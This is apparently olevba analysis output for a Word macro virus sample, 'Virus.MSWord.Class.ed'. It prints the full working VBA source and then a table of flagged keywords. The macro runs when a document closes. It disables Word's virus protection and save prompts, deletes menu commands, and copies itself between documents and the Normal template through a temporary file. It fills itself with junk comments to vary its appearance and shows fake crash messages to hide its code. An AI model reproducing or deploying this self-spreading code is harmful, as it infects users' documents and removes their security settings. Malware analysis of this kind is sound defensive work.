olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.ed
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.ed - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
On Error Resume Next
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
CommandBars("Tools").Controls("Options...").Delete
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
Options.VirusProtection = False
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
Options.SaveNormalPrompt = False
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
CommandBars("Format").Controls("Style...").Delete
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
Options.ConfirmConversions = False
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
CommandBars("Tools").Controls("Customize...").Delete
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 90 And ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 90 Then GoTo Epp
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines < 90 Then
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    Set Eho = NormalTemplate.VBProject.VBComponents.Item(1)
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\system.sys"
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("c:\system.sys")
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.replaceline 5, "Sub AutoClose"
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.replaceline 99, "Sub ToolsMacro"
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.replaceline 105, "Sub ViewVBCode"
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
End If
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines < 90 Then
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    Set Eho = ActiveDocument.VBProject.VBComponents.Item(1)
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("c:\system.sys")
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.replaceline 99, "Private Sub TM"
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.replaceline 105, "Private Sub VVBC"
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
End If
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
With Eho.CodeModule
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    For x = 1 To 4
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    .deletelines 1
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    Next x
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
End With
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
With Eho.CodeModule
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    For x = 2 To 104 Step 2
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    .replaceline x, "'" & Now & Application.ActivePrinter & Application.UserName & "sdjw3456ot76 weor9w58349583" & Now
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    Next x
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    .replaceline 106, "'MV Version 1e"
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
End With
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
If Day(Now) = 15 Then
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    CommandBars("File").Controls("Page Setup...").Delete
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    CommandBars("File").Controls("Print Preview").Delete
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    CommandBars("File").Controls("Print...").Delete
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    CommandBars("File").Controls("Exit").Delete
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    CommandBars("File").Controls("New...").Delete
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    CommandBars("File").Controls("Open...").Delete
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
    CommandBars("File").Controls("Close").Delete
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
End If
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
Epp:
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 80 And ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 80 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
End Sub
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
Sub ToolsMacro()
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
End Sub
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
Sub ViewVBCode()
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
'2/16/2000 9:10:23 PMWildListsdjw3456ot76 weor9w583495832/16/2000 9:10:23 PM
End Sub
'MV Version 1e


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

